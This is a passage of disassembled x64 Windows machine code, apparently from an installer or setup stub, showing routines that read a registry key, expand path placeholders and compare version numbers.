   14000257a:	e8 cd eb ff ff       	call   0x14000114c
   14000257f:	45 33 c9             	xor    %r9d,%r9d
   140002582:	c7 44 24 28 05 00 00 	movl   $0x5,0x28(%rsp)
   140002589:	00 
   14000258a:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   14000258f:	c7 44 24 20 20 00 00 	movl   $0x20,0x20(%rsp)
   140002596:	00 
   140002597:	ba bd 04 00 00       	mov    $0x4bd,%edx
   14000259c:	33 c9                	xor    %ecx,%ecx
   14000259e:	e8 29 28 00 00       	call   0x140004dcc
   1400025a3:	83 f8 04             	cmp    $0x4,%eax
   1400025a6:	0f 94 c3             	sete   %bl
   1400025a9:	eb 4f                	jmp    0x1400025fa
   1400025ab:	83 f9 02             	cmp    $0x2,%ecx
   1400025ae:	75 4a                	jne    0x1400025fa
   1400025b0:	45 8b c8             	mov    %r8d,%r9d
   1400025b3:	8d 51 08             	lea    0x8(%rcx),%edx
   1400025b6:	4c 8d 05 27 72 00 00 	lea    0x7227(%rip),%r8        # 0x1400097e4
   1400025bd:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400025c2:	e8 85 eb ff ff       	call   0x14000114c
   1400025c7:	4c 8b cf             	mov    %rdi,%r9
   1400025ca:	c7 44 24 28 04 01 00 	movl   $0x104,0x28(%rsp)
   1400025d1:	00 
   1400025d2:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   1400025d7:	c7 44 24 20 40 00 00 	movl   $0x40,0x20(%rsp)
   1400025de:	00 
   1400025df:	ba cc 04 00 00       	mov    $0x4cc,%edx
   1400025e4:	33 c9                	xor    %ecx,%ecx
   1400025e6:	e8 e1 27 00 00       	call   0x140004dcc
   1400025eb:	83 f8 06             	cmp    $0x6,%eax
   1400025ee:	75 0a                	jne    0x1400025fa
   1400025f0:	83 25 4d af 00 00 00 	andl   $0x0,0xaf4d(%rip)        # 0x14000d544
   1400025f7:	8d 58 fb             	lea    -0x5(%rax),%ebx
   1400025fa:	8b c3                	mov    %ebx,%eax
   1400025fc:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140002601:	48 33 cc             	xor    %rsp,%rcx
   140002604:	e8 67 5e 00 00       	call   0x140008470
   140002609:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   14000260e:	48 83 c4 50          	add    $0x50,%rsp
   140002612:	5f                   	pop    %rdi
   140002613:	c3                   	ret
   140002614:	cc                   	int3
   140002615:	cc                   	int3
   140002616:	cc                   	int3
   140002617:	cc                   	int3
   140002618:	cc                   	int3
   140002619:	cc                   	int3
   14000261a:	cc                   	int3
   14000261b:	cc                   	int3
   14000261c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002621:	55                   	push   %rbp
   140002622:	56                   	push   %rsi
   140002623:	57                   	push   %rdi
   140002624:	41 56                	push   %r14
   140002626:	41 57                	push   %r15
   140002628:	48 8d 6c 24 a0       	lea    -0x60(%rsp),%rbp
   14000262d:	48 81 ec 60 01 00 00 	sub    $0x160,%rsp
   140002634:	48 8b 05 cd 99 00 00 	mov    0x99cd(%rip),%rax        # 0x14000c008
   14000263b:	48 33 c4             	xor    %rsp,%rax
   14000263e:	48 89 45 50          	mov    %rax,0x50(%rbp)
   140002642:	33 ff                	xor    %edi,%edi
   140002644:	49 8b f0             	mov    %r8,%rsi
   140002647:	40 88 39             	mov    %dil,(%rcx)
   14000264a:	48 8b d9             	mov    %rcx,%rbx
   14000264d:	41 80 38 23          	cmpb   $0x23,(%r8)
   140002651:	44 8d 7f 01          	lea    0x1(%rdi),%r15d
   140002655:	0f 85 85 01 00 00    	jne    0x1400027e0
   14000265b:	49 03 f7             	add    %r15,%rsi
   14000265e:	48 0f be 0e          	movsbq (%rsi),%rcx
   140002662:	48 ff 15 f7 6e 00 00 	rex.W call *0x6ef7(%rip)        # 0x140009560
   140002669:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000266e:	48 8b ce             	mov    %rsi,%rcx
   140002671:	4c 8b f0             	mov    %rax,%r14
   140002674:	48 ff 15 ad 6e 00 00 	rex.W call *0x6ead(%rip)        # 0x140009528
   14000267b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002680:	48 8b c8             	mov    %rax,%rcx
   140002683:	48 ff 15 9e 6e 00 00 	rex.W call *0x6e9e(%rip)        # 0x140009528
   14000268a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000268f:	48 8b f0             	mov    %rax,%rsi
   140002692:	41 80 fe 53          	cmp    $0x53,%r14b
   140002696:	0f 84 41 01 00 00    	je     0x1400027dd
   14000269c:	41 80 fe 57          	cmp    $0x57,%r14b
   1400026a0:	0f 84 21 01 00 00    	je     0x1400027c7
   1400026a6:	4c 8d 05 3b 71 00 00 	lea    0x713b(%rip),%r8        # 0x1400097e8
   1400026ad:	c7 44 24 34 04 01 00 	movl   $0x104,0x34(%rsp)
   1400026b4:	00 
   1400026b5:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   1400026ba:	ba 04 01 00 00       	mov    $0x104,%edx
   1400026bf:	4c 2b c0             	sub    %rax,%r8
   1400026c2:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400026c7:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   1400026ce:	48 85 c0             	test   %rax,%rax
   1400026d1:	74 12                	je     0x1400026e5
   1400026d3:	41 8a 04 08          	mov    (%r8,%rcx,1),%al
   1400026d7:	84 c0                	test   %al,%al
   1400026d9:	74 0a                	je     0x1400026e5
   1400026db:	88 01                	mov    %al,(%rcx)
   1400026dd:	49 03 cf             	add    %r15,%rcx
   1400026e0:	49 2b d7             	sub    %r15,%rdx
   1400026e3:	75 e2                	jne    0x1400026c7
   1400026e5:	48 85 d2             	test   %rdx,%rdx
   1400026e8:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   1400026ec:	4c 8b c6             	mov    %rsi,%r8
   1400026ef:	ba 04 01 00 00       	mov    $0x104,%edx
   1400026f4:	48 0f 45 c1          	cmovne %rcx,%rax
   1400026f8:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400026fd:	40 88 38             	mov    %dil,(%rax)
   140002700:	e8 a3 54 00 00       	call   0x140007ba8
   140002705:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   14000270a:	41 b9 19 00 02 00    	mov    $0x20019,%r9d
   140002710:	45 33 c0             	xor    %r8d,%r8d
   140002713:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002718:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000271d:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
   140002724:	48 ff 15 0d 6a 00 00 	rex.W call *0x6a0d(%rip)        # 0x140009138
   14000272b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002730:	85 c0                	test   %eax,%eax
   140002732:	0f 85 bd 00 00 00    	jne    0x1400027f5
   140002738:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   14000273d:	48 8d 44 24 34       	lea    0x34(%rsp),%rax
   140002742:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140002747:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   14000274c:	45 33 c0             	xor    %r8d,%r8d
   14000274f:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140002754:	48 8d 15 a5 6f 00 00 	lea    0x6fa5(%rip),%rdx        # 0x140009700
   14000275b:	48 ff 15 16 6a 00 00 	rex.W call *0x6a16(%rip)        # 0x140009178
   140002762:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002767:	85 c0                	test   %eax,%eax
   140002769:	75 49                	jne    0x1400027b4
   14000276b:	8b 44 24 30          	mov    0x30(%rsp),%eax
   14000276f:	83 f8 02             	cmp    $0x2,%eax
   140002772:	75 39                	jne    0x1400027ad
   140002774:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   14000277a:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000277f:	48 8b cb             	mov    %rbx,%rcx
   140002782:	48 ff 15 37 6c 00 00 	rex.W call *0x6c37(%rip)        # 0x1400093c0
   140002789:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000278e:	85 c0                	test   %eax,%eax
   140002790:	74 17                	je     0x1400027a9
   140002792:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140002797:	ba 04 01 00 00       	mov    $0x104,%edx
   14000279c:	48 8b cb             	mov    %rbx,%rcx
   14000279f:	e8 64 e8 ff ff       	call   0x140001008
   1400027a4:	41 8b ff             	mov    %r15d,%edi
   1400027a7:	eb 0b                	jmp    0x1400027b4
   1400027a9:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1400027ad:	41 3b c7             	cmp    %r15d,%eax
   1400027b0:	41 0f 44 ff          	cmove  %r15d,%edi
   1400027b4:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400027b9:	48 ff 15 c8 69 00 00 	rex.W call *0x69c8(%rip)        # 0x140009188
   1400027c0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400027c5:	eb 2a                	jmp    0x1400027f1
   1400027c7:	ba 04 01 00 00       	mov    $0x104,%edx
   1400027cc:	48 8b cb             	mov    %rbx,%rcx
   1400027cf:	48 ff 15 7a 6a 00 00 	rex.W call *0x6a7a(%rip)        # 0x140009250
   1400027d6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400027db:	eb 18                	jmp    0x1400027f5
   1400027dd:	48 8b cb             	mov    %rbx,%rcx
   1400027e0:	ba 04 01 00 00       	mov    $0x104,%edx
   1400027e5:	48 ff 15 24 6a 00 00 	rex.W call *0x6a24(%rip)        # 0x140009210
   1400027ec:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400027f1:	85 ff                	test   %edi,%edi
   1400027f3:	75 10                	jne    0x140002805
   1400027f5:	4c 8b c6             	mov    %rsi,%r8
   1400027f8:	ba 04 01 00 00       	mov    $0x104,%edx
   1400027fd:	48 8b cb             	mov    %rbx,%rcx
   140002800:	e8 a3 53 00 00       	call   0x140007ba8
   140002805:	41 8b c7             	mov    %r15d,%eax
   140002808:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   14000280c:	48 33 cc             	xor    %rsp,%rcx
   14000280f:	e8 5c 5c 00 00       	call   0x140008470
   140002814:	48 8b 9c 24 98 01 00 	mov    0x198(%rsp),%rbx
   14000281b:	00 
   14000281c:	48 81 c4 60 01 00 00 	add    $0x160,%rsp
   140002823:	41 5f                	pop    %r15
   140002825:	41 5e                	pop    %r14
   140002827:	5f                   	pop    %rdi
   140002828:	5e                   	pop    %rsi
   140002829:	5d                   	pop    %rbp
   14000282a:	c3                   	ret
   14000282b:	cc                   	int3
   14000282c:	cc                   	int3
   14000282d:	cc                   	int3
   14000282e:	cc                   	int3
   14000282f:	cc                   	int3
   140002830:	cc                   	int3
   140002831:	cc                   	int3
   140002832:	cc                   	int3
   140002833:	cc                   	int3
   140002834:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140002839:	44 89 44 24 18       	mov    %r8d,0x18(%rsp)
   14000283e:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140002843:	55                   	push   %rbp
   140002844:	53                   	push   %rbx
   140002845:	56                   	push   %rsi
   140002846:	57                   	push   %rdi
   140002847:	41 54                	push   %r12
   140002849:	41 55                	push   %r13
   14000284b:	41 56                	push   %r14
   14000284d:	41 57                	push   %r15
   14000284f:	48 8b ec             	mov    %rsp,%rbp
   140002852:	48 83 ec 48          	sub    $0x48,%rsp
   140002856:	45 33 f6             	xor    %r14d,%r14d
   140002859:	48 8b f2             	mov    %rdx,%rsi
   14000285c:	4c 8b f9             	mov    %rcx,%r15
   14000285f:	41 8b de             	mov    %r14d,%ebx
   140002862:	45 8b ee             	mov    %r14d,%r13d
   140002865:	45 8b e6             	mov    %r14d,%r12d
   140002868:	44 39 71 7c          	cmp    %r14d,0x7c(%rcx)
   14000286c:	0f 8e bd 01 00 00    	jle    0x140002a2f
   140002872:	41 8b c6             	mov    %r14d,%eax
   140002875:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140002879:	41 8b bf 80 00 00 00 	mov    0x80(%r15),%edi
   140002880:	4d 8d 87 84 00 00 00 	lea    0x84(%r15),%r8
   140002887:	48 03 f8             	add    %rax,%rdi
   14000288a:	48 8b ce             	mov    %rsi,%rcx
   14000288d:	42 8b 84 3f bc 00 00 	mov    0xbc(%rdi,%r15,1),%eax
   140002894:	00 
   140002895:	4c 03 c0             	add    %rax,%r8
   140002898:	e8 7f fd ff ff       	call   0x14000261c
   14000289d:	85 c0                	test   %eax,%eax
   14000289f:	0f 84 90 01 00 00    	je     0x140002a35
   1400028a5:	48 8d 55 58          	lea    0x58(%rbp),%rdx
   1400028a9:	48 8b ce             	mov    %rsi,%rcx
   1400028ac:	48 ff 15 dd 6c 00 00 	rex.W call *0x6cdd(%rip)        # 0x140009590
   1400028b3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400028b8:	8b f0                	mov    %eax,%esi
   1400028ba:	85 c0                	test   %eax,%eax
   1400028bc:	0f 84 3c 01 00 00    	je     0x1400029fe
   1400028c2:	8b d6                	mov    %esi,%edx
   1400028c4:	b9 42 00 00 00       	mov    $0x42,%ecx
   1400028c9:	48 ff 15 58 69 00 00 	rex.W call *0x6958(%rip)        # 0x140009228
   1400028d0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400028d5:	48 8b d8             	mov    %rax,%rbx
   1400028d8:	48 85 c0             	test   %rax,%rax
   1400028db:	0f 84 54 01 00 00    	je     0x140002a35
   1400028e1:	48 8b c8             	mov    %rax,%rcx
   1400028e4:	48 ff 15 7d 69 00 00 	rex.W call *0x697d(%rip)        # 0x140009268
   1400028eb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400028f0:	4c 8b f0             	mov    %rax,%r14
   1400028f3:	48 85 c0             	test   %rax,%rax
   1400028f6:	0f 84 39 01 00 00    	je     0x140002a35
   1400028fc:	8b 55 58             	mov    0x58(%rbp),%edx
   1400028ff:	44 8b c6             	mov    %esi,%r8d
   140002902:	48 8b 75 50          	mov    0x50(%rbp),%rsi
   140002906:	4c 8b c8             	mov    %rax,%r9
   140002909:	48 8b ce             	mov    %rsi,%rcx
   14000290c:	48 ff 15 85 6c 00 00 	rex.W call *0x6c85(%rip)        # 0x140009598
   140002913:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002918:	85 c0                	test   %eax,%eax
   14000291a:	0f 84 ca 00 00 00    	je     0x1400029ea
   140002920:	4c 8d 4d 48          	lea    0x48(%rbp),%r9
   140002924:	49 8b ce             	mov    %r14,%rcx
   140002927:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   14000292b:	48 8d 15 ea 6e 00 00 	lea    0x6eea(%rip),%rdx        # 0x14000981c
   140002932:	48 ff 15 4f 6c 00 00 	rex.W call *0x6c4f(%rip)        # 0x140009588
   140002939:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000293e:	45 33 f6             	xor    %r14d,%r14d
   140002941:	85 c0                	test   %eax,%eax
   140002943:	0f 84 a4 00 00 00    	je     0x1400029ed
   140002949:	44 39 75 48          	cmp    %r14d,0x48(%rbp)
   14000294d:	0f 84 9a 00 00 00    	je     0x1400029ed
   140002953:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140002957:	49 8d 8f 90 00 00 00 	lea    0x90(%r15),%rcx
   14000295e:	48 03 cf             	add    %rdi,%rcx
   140002961:	41 8b d6             	mov    %r14d,%edx
   140002964:	44 8b 48 0c          	mov    0xc(%rax),%r9d
   140002968:	44 8b 40 08          	mov    0x8(%rax),%r8d
   14000296c:	44 3b 41 f4          	cmp    -0xc(%rcx),%r8d
   140002970:	73 05                	jae    0x140002977
   140002972:	83 c8 ff             	or     $0xffffffff,%eax
   140002975:	eb 15                	jmp    0x14000298c
   140002977:	76 07                	jbe    0x140002980
   140002979:	b8 01 00 00 00       	mov    $0x1,%eax
   14000297e:	eb 0c                	jmp    0x14000298c
   140002980:	44 3b 49 f8          	cmp    -0x8(%rcx),%r9d
   140002984:	72 ec                	jb     0x140002972
   140002986:	41 8b c6             	mov    %r14d,%eax
   140002989:	0f 97 c0             	seta   %al
   14000298c:	89 44 15 d8          	mov    %eax,-0x28(%rbp,%rdx,1)
   140002990:	44 3b 01             	cmp    (%rcx),%r8d
   140002993:	73 05                	jae    0x14000299a
   140002995:	83 c8 ff             	or     $0xffffffff,%eax
   140002998:	eb 15                	jmp    0x1400029af
   14000299a:	76 07                	jbe    0x1400029a3
   14000299c:	b8 01 00 00 00       	mov    $0x1,%eax
   1400029a1:	eb 0c                	jmp    0x1400029af
   1400029a3:	44 3b 49 04          	cmp    0x4(%rcx),%r9d
   1400029a7:	72 ec                	jb     0x140002995
   1400029a9:	41 8b c6             	mov    %r14d,%eax
   1400029ac:	0f 97 c0             	seta   %al
   1400029af:	89 44 15 e0          	mov    %eax,-0x20(%rbp,%rdx,1)
   1400029b3:	48 83 c1 18          	add    $0x18,%rcx
   1400029b7:	48 83 c2 04          	add    $0x4,%rdx
   1400029bb:	48 83 fa 08          	cmp    $0x8,%rdx
   1400029bf:	7c ab                	jl     0x14000296c
   1400029c1:	44 39 75 d8          	cmp    %r14d,-0x28(%rbp)
   1400029c5:	7c 06                	jl     0x1400029cd
   1400029c7:	44 39 75 e0          	cmp    %r14d,-0x20(%rbp)
   1400029cb:	7e 20                	jle    0x1400029ed
   1400029cd:	44 39 75 dc          	cmp    %r14d,-0x24(%rbp)
   1400029d1:	7c 06                	jl     0x1400029d9
   1400029d3:	44 39 75 e4          	cmp    %r14d,-0x1c(%rbp)
   1400029d7:	7e 14                	jle    0x1400029ed
   1400029d9:	48 8b cb             	mov    %rbx,%rcx
   1400029dc:	48 ff 15 c5 68 00 00 	rex.W call *0x68c5(%rip)        # 0x1400092a8
   1400029e3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400029e8:	eb 4b                	jmp    0x140002a35
   1400029ea:	45 33 f6             	xor    %r14d,%r14d
   1400029ed:	48 8b cb             	mov    %rbx,%rcx
   1400029f0:	48 ff 15 b1 68 00 00 	rex.W call *0x68b1(%rip)        # 0x1400092a8
   1400029f7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400029fc:	eb 18                	jmp    0x140002a16
   1400029fe:	46 39 b4 3f 84 00 00 	cmp    %r14d,0x84(%rdi,%r15,1)
   140002a05:	00 
   140002a06:	75 2d                	jne    0x140002a35
   140002a08:	46 39 b4 3f 88 00 00 	cmp    %r14d,0x88(%rdi,%r15,1)
   140002a0f:	00 
   140002a10:	75 23                	jne    0x140002a35
   140002a12:	48 8b 75 50          	mov    0x50(%rbp),%rsi
   140002a16:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140002a1a:	41 ff c4             	inc    %r12d
   140002a1d:	48 83 c0 3c          	add    $0x3c,%rax
   140002a21:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140002a25:	45 3b 67 7c          	cmp    0x7c(%r15),%r12d
   140002a29:	0f 8c 4a fe ff ff    	jl     0x140002879
   140002a2f:	41 bd 01 00 00 00    	mov    $0x1,%r13d
   140002a35:	48 8b 45 60          	mov    0x60(%rbp),%rax
   140002a39:	44 89 20             	mov    %r12d,(%rax)
   140002a3c:	48 85 db             	test   %rbx,%rbx
   140002a3f:	74 0f                	je     0x140002a50
   140002a41:	48 8b cb             	mov    %rbx,%rcx
   140002a44:	48 ff 15 e5 67 00 00 	rex.W call *0x67e5(%rip)        # 0x140009230
   140002a4b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002a50:	41 8b c5             	mov    %r13d,%eax
   140002a53:	48 83 c4 48          	add    $0x48,%rsp
   140002a57:	41 5f                	pop    %r15
   140002a59:	41 5e                	pop    %r14
   140002a5b:	41 5d                	pop    %r13
   140002a5d:	41 5c                	pop    %r12
   140002a5f:	5f                   	pop    %rdi
   140002a60:	5e                   	pop    %rsi
   140002a61:	5b                   	pop    %rbx
   140002a62:	5d                   	pop    %rbp
   140002a63:	c3                   	ret
   140002a64:	cc                   	int3
   140002a65:	cc                   	int3
   140002a66:	cc                   	int3
   140002a67:	cc                   	int3
   140002a68:	cc                   	int3
   140002a69:	cc                   	int3
   140002a6a:	cc                   	int3
   140002a6b:	cc                   	int3
   140002a6c:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140002a71:	56                   	push   %rsi
   140002a72:	57                   	push   %rdi
   140002a73:	41 57                	push   %r15
   140002a75:	48 81 ec 40 01 00 00 	sub    $0x140,%rsp
   140002a7c:	48 8b 05 85 95 00 00 	mov    0x9585(%rip),%rax        # 0x14000c008
   140002a83:	48 33 c4             	xor    %rsp,%rax
   140002a86:	48 89 84 24 30 01 00 	mov    %rax,0x130(%rsp)
   140002a8d:	00 
   140002a8e:	80 39 00             	cmpb   $0x0,(%rcx)
   140002a91:	49 8b d8             	mov    %r8,%rbx
   140002a94:	48 8b f2             	mov    %rdx,%rsi
   140002a97:	48 8b f9             	mov    %rcx,%rdi
   140002a9a:	0f 84 87 01 00 00    	je     0x140002c27
   140002aa0:	48 8b 0d c9 b3 00 00 	mov    0xb3c9(%rip),%rcx        # 0x14000de70
   140002aa7:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140002aac:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140002ab2:	48 ff 15 37 69 00 00 	rex.W call *0x6937(%rip)        # 0x1400093f0
   140002ab9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002abe:	8a 07                	mov    (%rdi),%al
   140002ac0:	84 c0                	test   %al,%al
   140002ac2:	0f 84 5c 01 00 00    	je     0x140002c24
   140002ac8:	49 83 cf ff          	or     $0xffffffffffffffff,%r15
   140002acc:	8a c8                	mov    %al,%cl
   140002ace:	48 ff 15 73 67 00 00 	rex.W call *0x6773(%rip)        # 0x140009248
   140002ad5:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002ada:	8a 17                	mov    (%rdi),%dl
   140002adc:	88 13                	mov    %dl,(%rbx)
   140002ade:	85 c0                	test   %eax,%eax
   140002ae0:	74 06                	je     0x140002ae8
   140002ae2:	8a 47 01             	mov    0x1(%rdi),%al
   140002ae5:	88 43 01             	mov    %al,0x1(%rbx)
   140002ae8:	80 3f 23             	cmpb   $0x23,(%rdi)
   140002aeb:	0f 85 05 01 00 00    	jne    0x140002bf6
   140002af1:	48 8b cf             	mov    %rdi,%rcx
   140002af4:	48 ff 15 2d 6a 00 00 	rex.W call *0x6a2d(%rip)        # 0x140009528
   140002afb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002b00:	48 8b f8             	mov    %rax,%rdi
   140002b03:	48 0f be 08          	movsbq (%rax),%rcx
   140002b07:	48 ff 15 52 6a 00 00 	rex.W call *0x6a52(%rip)        # 0x140009560
   140002b0e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002b13:	3c 44                	cmp    $0x44,%al
   140002b15:	0f 85 80 00 00 00    	jne    0x140002b9b
   140002b1b:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002b20:	e8 1b 51 00 00       	call   0x140007c40
   140002b25:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002b2a:	49 8b c7             	mov    %r15,%rax
   140002b2d:	48 ff c0             	inc    %rax
   140002b30:	80 3c 01 00          	cmpb   $0x0,(%rcx,%rax,1)
   140002b34:	75 f7                	jne    0x140002b2d
   140002b36:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140002b3b:	48 03 d0             	add    %rax,%rdx
   140002b3e:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002b43:	48 ff 15 ee 69 00 00 	rex.W call *0x69ee(%rip)        # 0x140009538
   140002b4a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002b4f:	48 85 c0             	test   %rax,%rax
   140002b52:	74 08                	je     0x140002b5c
   140002b54:	80 38 5c             	cmpb   $0x5c,(%rax)
   140002b57:	75 03                	jne    0x140002b5c
   140002b59:	c6 00 00             	movb   $0x0,(%rax)
   140002b5c:	48 3b de             	cmp    %rsi,%rbx
   140002b5f:	72 1d                	jb     0x140002b7e
   140002b61:	48 8b c3             	mov    %rbx,%rax
   140002b64:	48 2b c6             	sub    %rsi,%rax
   140002b67:	48 3d 00 04 00 00    	cmp    $0x400,%rax
   140002b6d:	77 0f                	ja     0x140002b7e
   140002b6f:	48 8b d6             	mov    %rsi,%rdx
   140002b72:	48 2b d3             	sub    %rbx,%rdx
   140002b75:	48 81 c2 00 04 00 00 	add    $0x400,%rdx
   140002b7c:	eb 02                	jmp    0x140002b80
   140002b7e:	33 d2                	xor    %edx,%edx
   140002b80:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   140002b85:	48 8b cb             	mov    %rbx,%rcx
   140002b88:	e8 7b e4 ff ff       	call   0x140001008
   140002b8d:	49 8b c7             	mov    %r15,%rax
   140002b90:	48 ff c0             	inc    %rax
   140002b93:	80 3c 03 00          	cmpb   $0x0,(%rbx,%rax,1)
   140002b97:	75 f7                	jne    0x140002b90
   140002b99:	eb 51                	jmp    0x140002bec
   140002b9b:	48 0f be 0f          	movsbq (%rdi),%rcx
   140002b9f:	48 ff 15 ba 69 00 00 	rex.W call *0x69ba(%rip)        # 0x140009560
   140002ba6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002bab:	3c 45                	cmp    $0x45,%al
   140002bad:	75 42                	jne    0x140002bf1
   140002baf:	48 3b de             	cmp    %rsi,%rbx
   140002bb2:	72 1d                	jb     0x140002bd1
   140002bb4:	48 8b c3             	mov    %rbx,%rax
   140002bb7:	48 2b c6             	sub    %rsi,%rax
   140002bba:	48 3d 00 04 00 00    	cmp    $0x400,%rax
   140002bc0:	77 0f                	ja     0x140002bd1
   140002bc2:	48 8b d6             	mov    %rsi,%rdx
   140002bc5:	48 2b d3             	sub    %rbx,%rdx
   140002bc8:	48 81 c2 00 04 00 00 	add    $0x400,%rdx
   140002bcf:	eb 02                	jmp    0x140002bd3
   140002bd1:	33 d2                	xor    %edx,%edx
   140002bd3:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   140002bd8:	48 8b cb             	mov    %rbx,%rcx
   140002bdb:	e8 28 e4 ff ff       	call   0x140001008
   140002be0:	49 8b c7             	mov    %r15,%rax
   140002be3:	48 ff c0             	inc    %rax
   140002be6:	80 3c 03 00          	cmpb   $0x0,(%rbx,%rax,1)
   140002bea:	75 f7                	jne    0x140002be3
   140002bec:	48 03 d8             	add    %rax,%rbx
   140002bef:	eb 17                	jmp    0x140002c08
   140002bf1:	80 3f 23             	cmpb   $0x23,(%rdi)
   140002bf4:	75 12                	jne    0x140002c08
   140002bf6:	48 8b cb             	mov    %rbx,%rcx
   140002bf9:	48 ff 15 28 69 00 00 	rex.W call *0x6928(%rip)        # 0x140009528
   140002c00:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002c05:	48 8b d8             	mov    %rax,%rbx
   140002c08:	48 8b cf             	mov    %rdi,%rcx
   140002c0b:	48 ff 15 16 69 00 00 	rex.W call *0x6916(%rip)        # 0x140009528
   140002c12:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002c17:	48 8b f8             	mov    %rax,%rdi
   140002c1a:	8a 00                	mov    (%rax),%al
   140002c1c:	84 c0                	test   %al,%al
   140002c1e:	0f 85 a8 fe ff ff    	jne    0x140002acc
   140002c24:	c6 03 00             	movb   $0x0,(%rbx)
   140002c27:	48 8b 8c 24 30 01 00 	mov    0x130(%rsp),%rcx
   140002c2e:	00 
   140002c2f:	48 33 cc             	xor    %rsp,%rcx
   140002c32:	e8 39 58 00 00       	call   0x140008470
   140002c37:	48 8b 9c 24 78 01 00 	mov    0x178(%rsp),%rbx
   140002c3e:	00 
   140002c3f:	48 81 c4 40 01 00 00 	add    $0x140,%rsp
   140002c46:	41 5f                	pop    %r15
   140002c48:	5f                   	pop    %rdi
   140002c49:	5e                   	pop    %rsi
   140002c4a:	c3                   	ret
   140002c4b:	cc                   	int3
   140002c4c:	cc                   	int3
   140002c4d:	cc                   	int3
   140002c4e:	cc                   	int3
   140002c4f:	cc                   	int3
   140002c50:	cc                   	int3
   140002c51:	cc                   	int3
   140002c52:	cc                   	int3
   140002c53:	cc                   	int3
   140002c54:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002c59:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140002c5e:	57                   	push   %rdi
   140002c5f:	48 83 ec 30          	sub    $0x30,%rsp
   140002c63:	49 8b d8             	mov    %r8,%rbx
   140002c66:	48 8b f9             	mov    %rcx,%rdi
   140002c69:	48 ff 15 a8 66 00 00 	rex.W call *0x66a8(%rip)        # 0x140009318
   140002c70:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002c75:	33 f6                	xor    %esi,%esi
   140002c77:	85 c0                	test   %eax,%eax
   140002c79:	78 48                	js     0x140002cc3
   140002c7b:	3c 06                	cmp    $0x6,%al
   140002c7d:	72 44                	jb     0x140002cc3
   140002c7f:	48 8d 0d 9a 6b 00 00 	lea    0x6b9a(%rip),%rcx        # 0x140009820
   140002c86:	48 ff 15 fb 66 00 00 	rex.W call *0x66fb(%rip)        # 0x140009388
   140002c8d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002c92:	48 85 c0             	test   %rax,%rax
